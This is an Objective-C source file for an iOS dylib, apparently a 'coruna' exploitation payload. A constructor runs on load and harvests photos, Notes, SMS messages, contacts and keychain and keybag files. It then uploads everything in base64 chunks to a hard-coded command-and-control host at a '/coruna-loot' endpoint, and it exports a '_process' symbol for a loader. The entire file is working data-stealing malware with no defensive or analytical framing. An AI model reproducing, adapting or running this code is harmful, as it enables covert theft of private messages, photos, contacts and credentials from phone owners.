// collector.m — coruna payload dylib (arm64e)
// 加载后自动采集：相册 / 备忘录 / 短信 / 通讯录 / 钥匙串，POST 回 C2
#import <Foundation/Foundation.h>
#include <sqlite3.h>
#include <unistd.h>
#include <pwd.h>
#include <sys/stat.h>

static NSString *const kHost = @"myg3z1adawtxz0s.icu";
static NSString *const kLootPath = @"/coruna-loot";

#pragma mark - HTTP over CFStream TLS

static void PostJSON(NSString *path, NSDictionary *body) {
    NSData *json = [NSJSONSerialization dataWithJSONObject:body options:0 error:nil];
    if (!json) return;
    NSString *hdr = [NSString stringWithFormat:
        @"POST %@ HTTP/1.1\r\nHost: %@\r\nContent-Type: application/json\r\nContent-Length: %lu\r\nConnection: close\r\n\r\n",
        path, kHost, (unsigned long)json.length];
    NSMutableData *req = [[hdr dataUsingEncoding:NSUTF8StringEncoding] mutableCopy];
    [req appendData:json];

    CFReadStreamRef rd = NULL; CFWriteStreamRef wr = NULL;
    CFStreamCreatePairWithSocketToHost(NULL, (__bridge CFStringRef)kHost, 443, &rd, &wr);
    if (!rd || !wr) return;

    NSDictionary *tls = @{ (__bridge id)kCFStreamSSLLevel:
                           (__bridge id)kCFStreamSocketSecurityLevelNegotiatedSSL };
    CFReadStreamSetProperty(rd, kCFStreamPropertySSLSettings, (__bridge CFDictionaryRef)tls);
    CFWriteStreamSetProperty(wr, kCFStreamPropertySSLSettings, (__bridge CFDictionaryRef)tls);

    if (!CFWriteStreamOpen(wr) || !CFReadStreamOpen(rd)) {
        CFRelease(rd); CFRelease(wr); return;
    }
    const uint8_t *p = req.bytes; CFIndex left = (CFIndex)req.length;
    for (int i = 0; i < 300 && left > 0; i++) {
        if (!CFWriteStreamCanAcceptBytes(wr)) { usleep(10000); continue; }
        CFIndex n = CFWriteStreamWrite(wr, p, left);
        if (n <= 0) break;
        p += n; left -= n;
    }
    CFWriteStreamClose(wr); CFReadStreamClose(rd);
    CFRelease(rd); CFRelease(wr);
}

#pragma mark - 文件上传（分块 base64）

static NSDictionary *FilePost(NSString *localPath, NSString *name) {
    NSData *d = [NSData dataWithContentsOfFile:localPath];
    if (!d || d.length == 0) return @{@"file": name, @"ok": @NO, @"err": @"missing"};
    NSString *b64 = [d base64EncodedStringWithOptions:0];
    const NSUInteger CH = 200000;
    NSUInteger total = (b64.length + CH - 1) / CH;
    for (NSUInteger i = 0; i < total; i++) {
        NSUInteger len = MIN(CH, b64.length - i * CH);
        NSString *part = [b64 substringWithRange:NSMakeRange(i * CH, len)];
        PostJSON(kLootPath, @{@"source": @"collector", @"cmd": @"file_chunk",
            @"data": @{@"name": name, @"idx": @(i), @"total": @(total),
                       @"size": @(d.length), @"b64": part}});
    }
    return @{@"file": name, @"ok": @YES, @"size": @(d.length)};
}

#pragma mark - 采集器

static NSArray *CollectPhotos(void) {
    NSMutableArray *out = [NSMutableArray array];
    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray *dirs = @[@"/var/mobile/Media/DCIM/100APPLE", @"/var/mobile/Media/DCIM"];
    for (NSString *dir in dirs) {
        for (NSString *it in [fm contentsOfDirectoryAtPath:dir error:nil]) {
            if (out.count >= 40) break;
            NSString *low = it.lowercaseString;
            if (![low hasSuffix:@".jpg"] && ![low hasSuffix:@".heic"] && ![low hasSuffix:@".png"])
                continue;
            [out addObject:FilePost([dir stringByAppendingPathComponent:it], it)];
        }
    }
    return out;
}

static NSArray *CollectNotes(void) {
    NSMutableArray *rows = [NSMutableArray array];
    sqlite3 *db = NULL;
    if (sqlite3_open_v2("/var/mobile/Library/Notes/NoteStore.sqlite", &db,
                        SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) return rows;
    sqlite3_stmt *st = NULL;
    if (sqlite3_prepare_v2(db, "SELECT ZTITLE1, ZSNIPPET FROM ZNOTE LIMIT 200", -1, &st, NULL) == SQLITE_OK) {
        while (sqlite3_step(st) == SQLITE_ROW) {
            const unsigned char *t = sqlite3_column_text(st, 0);
            const unsigned char *s = sqlite3_column_text(st, 1);
            [rows addObject:@{@"title": t ? @((const char *)t) : @"",
                              @"snippet": s ? @((const char *)s) : @""}];
        }
    }
    sqlite3_finalize(st); sqlite3_close(db);
    return rows;
}

static NSArray *CollectSMS(void) {
    NSMutableArray *rows = [NSMutableArray array];
    sqlite3 *db = NULL;
    if (sqlite3_open_v2("/var/mobile/Library/SMS/sms.db", &db, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK)
        return rows;
    sqlite3_stmt *st = NULL;
    if (sqlite3_prepare_v2(db, "SELECT address, text FROM message ORDER BY ROWID DESC LIMIT 300",
                           -1, &st, NULL) == SQLITE_OK) {
        while (sqlite3_step(st) == SQLITE_ROW) {
            const unsigned char *a = sqlite3_column_text(st, 0);
            const unsigned char *t = sqlite3_column_text(st, 1);
            [rows addObject:@{@"from": a ? @((const char *)a) : @"",
                              @"text": t ? @((const char *)t) : @""}];
        }
    }
    sqlite3_finalize(st); sqlite3_close(db);
    return rows;
}

static NSArray *CollectContacts(void) {
    NSMutableArray *rows = [NSMutableArray array];
    sqlite3 *db = NULL;
    if (sqlite3_open_v2("/var/mobile/Library/AddressBook/AddressBook.sqlitedb", &db,
                        SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) return rows;
    sqlite3_stmt *st = NULL;
    if (sqlite3_prepare_v2(db, "SELECT First, Last, Organization FROM ABPerson LIMIT 500",
                           -1, &st, NULL) == SQLITE_OK) {
        while (sqlite3_step(st) == SQLITE_ROW) {
            const unsigned char *f = sqlite3_column_text(st, 0);
            const unsigned char *l = sqlite3_column_text(st, 1);
            const unsigned char *o = sqlite3_column_text(st, 2);
            [rows addObject:@{
                @"name": [NSString stringWithFormat:@"%@ %@",
                          f ? @((const char *)f) : @"", l ? @((const char *)l) : @""],
                @"org": o ? @((const char *)o) : @""}];
        }
    }
    sqlite3_finalize(st); sqlite3_close(db);
    return rows;
}

static NSArray *CollectKeychainFiles(void) {
    NSMutableArray *out = [NSMutableArray array];
    NSArray *files = @[
        @"/private/var/Keychains/keychain-2.db",
        @"/var/Keychains/keychain-2.db",
        @"/private/var/Keychains/System.keybag",
        @"/private/var/Keychains/Backup.keybag",
        @"/private/var/keybags/persona.kb",
        @"/private/var/keybags/usersession.kb",
    ];
    for (NSString *f in files) {
        if ([[NSFileManager defaultManager] fileExistsAtPath:f])
            [out addObject:FilePost(f, [f lastPathComponent])];
    }
    return out;
}

#pragma mark - 入口

static void CollectorMain(void) {
    @autoreleasepool {
        uid_t uid = getuid();
        struct passwd *pw = getpwuid(uid);
        PostJSON(kLootPath, @{@"source": @"collector", @"cmd": @"hello",
            @"data": @{@"uid": @(uid),
                       @"user": pw ? @(pw->pw_name) : @"?",
                       @"ver": [[NSProcessInfo processInfo] operatingSystemVersionString] ?: @""}});
        PostJSON(kLootPath, @{@"source": @"collector", @"cmd": @"notes",    @"data": CollectNotes()});
        PostJSON(kLootPath, @{@"source": @"collector", @"cmd": @"sms",      @"data": CollectSMS()});
        PostJSON(kLootPath, @{@"source": @"collector", @"cmd": @"contacts", @"data": CollectContacts()});
        PostJSON(kLootPath, @{@"source": @"collector", @"cmd": @"photos",   @"data": CollectPhotos()});
        PostJSON(kLootPath, @{@"source": @"collector", @"cmd": @"keychain", @"data": CollectKeychainFiles()});
        PostJSON(kLootPath, @{@"source": @"collector", @"cmd": @"done"});
    }
}

__attribute__((constructor))
static void CollectorCtor(void) { CollectorMain(); }

// 与 bootstrap.dylib 的 _process 符号名对齐，供按名查找入口的加载器使用
void _process(void) __attribute__((visibility("default")));
void _process(void) { CollectorMain(); }